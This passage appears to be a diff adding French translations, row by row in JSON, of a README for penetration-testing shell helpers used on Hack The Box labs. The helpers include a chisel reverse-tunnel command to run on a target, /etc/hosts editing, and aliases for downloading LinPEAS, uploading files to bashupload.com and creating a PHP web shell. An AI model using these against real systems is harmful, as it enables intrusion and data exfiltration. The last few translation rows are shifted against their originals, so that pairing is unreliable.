+    "translatedContent": "```"
+  },
+  {
+    "row": 238,
+    "rowsha": "JRkDj+QesiHUETA6fef6cru7SuWW+YT5i+IoLHkJOyE=",
+    "originContent": "### > chisel_forward $local_ip $local_port $remote_ip $remote_port",
+    "translatedContent": "### > chisel_forward $local_ip $local_port $remote_ip $remote_port"
+  },
+  {
+    "row": 239,
+    "rowsha": "mgXcU6U3GFhG+2yjbwbyPOKQsxlIpsaUwybiYKl9hgc=",
+    "originContent": "Sets up port forwarding using Chisel.",
+    "translatedContent": "Configure le transfert de port avec Chisel."
+  },
+  {
+    "row": 240,
+    "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+    "originContent": "Example:",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 241,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 242,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 243,
+    "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+    "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 244,
+    "rowsha": "9otPe/HQtYeFUYFbNNnhaBcbpwMyRAgfwcXfNqeL2p4=",
+    "originContent": "└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080",
+    "translatedContent": "└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080"
+  },
+  {
+    "row": 245,
+    "rowsha": "5k6wXPokKPNKp5cTYJ5y9x+KrslVCQbfawvMNQbS530=",
+    "originContent": "[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080",
+    "translatedContent": "[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080"
+  },
+  {
+    "row": 246,
+    "rowsha": "t5uxR79DRnb14R+jKoYk9FooTpbIMVjeQCw7Bi7ZNgI=",
+    "originContent": "[+] Run this on the target machine",
+    "translatedContent": "[+] Run this on the target machine"
+  },
+  {
+    "row": 247,
+    "rowsha": "eL40uUsk+3oXveZchgRK+YroNrrIxYEZbQKbvV2jhYc=",
+    "originContent": "2024/08/05 23:32:30 server: Reverse tunnelling enabled",
+    "translatedContent": "2024/08/05 23:32:30 server: Reverse tunnelling enabled"
+  },
+  {
+    "row": 248,
+    "rowsha": "iBX7Mw1VFpfQm0qXwxbRQKrx3qKIQVY0MSfEq8Jh9PQ=",
+    "originContent": "2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=",
+    "translatedContent": "2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw="
+  },
+  {
+    "row": 249,
+    "rowsha": "1aMdL6M2pCw80RE44jV7KG6L1Cru61JTVP3EP8HR6vA=",
+    "originContent": "2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888",
+    "translatedContent": "2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888"
+  },
+  {
+    "row": 250,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 251,
+    "rowsha": "2tSXyZfSFQ2Z3FI+yxuuDz144ndwjaNGoAMsI1Ra6RU=",
+    "originContent": "## Host Management",
+    "translatedContent": "## Gestion des hôtes"
+  },
+  {
+    "row": 252,
+    "rowsha": "nBVd6aS4566+YXyM3wnUdoX6tdFs6vNS+gGcqha8eow=",
+    "originContent": "### > addhost $ip $hostname",
+    "translatedContent": "### > addhost $ip $hostname"
+  },
+  {
+    "row": 253,
+    "rowsha": "YPPgX0sDAu06d8354VWnKDXKBVmObmtMBT9PvGAh17o=",
+    "originContent": "Adds or updates an entry in the /etc/hosts file.",
+    "translatedContent": "Ajoute ou met à jour une entrée dans le fichier /etc/hosts."
+  },
+  {
+    "row": 254,
+    "rowsha": "hyiH5WPnWVf/wgsCEzJQTy3dCo85ZMuTBwhjv68Tza0=",
+    "originContent": "Example:",
+    "translatedContent": "Exemple :"
+  },
+  {
+    "row": 255,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 256,
+    "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+    "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 257,
+    "rowsha": "ecpN/TXxL+u/HTssNA7XXji/xuYOVbk7quF9w/U0Tt0=",
+    "originContent": "└─$ addhost 10.10.11.234 big.box.htb ",
+    "translatedContent": "└─$ addhost 10.10.11.234 big.box.htb "
+  },
+  {
+    "row": 258,
+    "rowsha": "4mr0d45y9gkrAR0umaByCKvt7vtfTyABmiS96fU41KM=",
+    "originContent": "[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts",
+    "translatedContent": "[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts"
+  },
+  {
+    "row": 259,
+    "rowsha": "1xUEIONkHYRgk2mj0hYDGZse4uDr9+6u5X6LpB0pMT8=",
+    "originContent": "10.10.11.234 boss.htb big.boss.htb big.box.htb",
+    "translatedContent": "10.10.11.234 boss.htb big.boss.htb big.box.htb"
+  },
+  {
+    "row": 260,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 261,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": ""
+  },
+  {
+    "row": 262,
+    "rowsha": "FsQhnV1ZDXQKYJwmnmwkG+G/Yhv6Th/aEh8qMiTCapA=",
+    "originContent": "┌──(22sh㉿kali)-[~/jazz]",
+    "translatedContent": "┌──(22sh㉿kali)-[~/jazz]"
+  },
+  {
+    "row": 263,
+    "rowsha": "FdSsg+fAHMqZhTHLDwRHuy+r4iGhjTBLrlu3VTMRQqs=",
+    "originContent": "└─$ addhost 10.10.11.235 newbox.htb ",
+    "translatedContent": "└─$ addhost 10.10.11.235 newbox.htb "
+  },
+  {
+    "row": 264,
+    "rowsha": "ZI7v/GhuJaSS5llC74BoP3cplbuhAIzKGoqzeoKBYvE=",
+    "originContent": "[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts",
+    "translatedContent": "[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts"
+  },
+  {
+    "row": 265,
+    "rowsha": "THlsUP646hVNIqbpox5/7B0L1MvfiedsAfE44vmujbY=",
+    "originContent": "10.10.11.235 newbox.htb",
+    "translatedContent": "10.10.11.235 newbox.htb"
+  },
+  {
+    "row": 266,
+    "rowsha": "8bkBhHOQsO1+N058HkZOwXtGpCfEh6WtbL0pBkBQg9U=",
+    "originContent": "```",
+    "translatedContent": "```"
+  },
+  {
+    "row": 267,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": "## Alias supplémentaires"
+  },
+  {
+    "row": 268,
+    "rowsha": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+    "originContent": "",
+    "translatedContent": "- `linpeas` : Télécharge la dernière version de LinPEAS."
+  },
+  {
+    "row": 269,
+    "rowsha": "SE+uc7B6/HAMK3uVdz260OyOP02iHrrB83eIXEDFahE=",
+    "originContent": "## Additional Aliases",
+    "translatedContent": "- `upload` : Téléverse un fichier en utilisant bashupload.com."
+  },
+  {
+    "row": 270,
+    "rowsha": "aKNbgoVAlxIfcvv112kJr4TmNko49WpcGDTYU+8oI48=",
+    "originContent": "- `linpeas`: Downloads the latest version of LinPEAS.",
+    "translatedContent": "- `phpcmd` : Crée un web shell PHP simple."
+  },
+  {
+    "row": 271,
+    "rowsha": "32gJGTWVn5Aq5U6czxhTbsBk+nkjZaqg6T/SW8Ranko=",
+    "originContent": "- `upload`: Uploads a file using bashupload.com.",
+    "translatedContent": "- `burl` : curl utilisant le proxy burpsuite."
+  },
+  {
+    "row": 272,
+    "rowsha": "RjlBCgumNaFYPuhQj7v4nRPHEUa/QtN7Nk2GMicFQvw=",
+    "originContent": "- `phpcmd`: Creates a simple PHP web shell.",
+    "translatedContent": ""
+  },
+  {
+    "row": 273,
+    "rowsha": "uAy0CqhS0reLyGgvEh4B6NKJcquQwZeakZZzKynMkzo=",
+    "originContent": "- `burl`: curl using burpsuite proxy.",
+    "translatedContent": ""
+  }
+]
